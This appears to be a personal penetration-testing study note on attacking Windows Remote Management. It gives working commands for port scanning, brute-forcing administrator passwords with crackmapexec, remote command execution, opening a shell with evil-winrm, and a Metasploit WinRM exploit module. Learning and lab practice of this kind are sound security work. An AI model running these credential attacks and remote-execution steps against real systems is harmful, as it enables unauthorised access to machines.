---
up: "[[Exploiting Windows Vulnerabilities]]"
tools:
  - "[[crackmapexec]]"
  - "[[evil-winrm]]"
  - "[[Metasploit]]"
---
	
# Exploiting WinRM

- Windows Remote Management can be used to remote access with Windows systems over HTTP(S)
- Feature not enable by default
- Implemented in order to make life easier for system administrator
- Typically uses TCP 5985 and 5986 (HTTPS)

## Exploiting WinRM

- Implements access control and security for communication
- ``crackmapexec`` can be used to brute-force users and passwords on WinRM as well as execute commands on the target
- Also there is ``evil-winrm`` a ruby script used to obtain a command shell session

## Demonstration

```bash
nmap -sV -p- $TRG
```

By default nmap is not searching for port 5985 or 5986.

```bash
crackmapexec winrm $TRG -u administrator -p unix_passwords.txt
```

Execute commands:

```bash
crackmapexec winrm $TRG -u administrator -p <password> -x "whoami"
```

Obtain shell session:

```bash
evil-winrm.rb -u administrator -p '<password>' -i $TRG
```

### Using Metasploit

```bash
> use exploit/windows/winrm/winrm_script_exec
> set RHOSTS $TRG 
> set FORCE_VBS true
> set USERNAME administrator
> set PASSWORD <password>
```

It may not work first try.
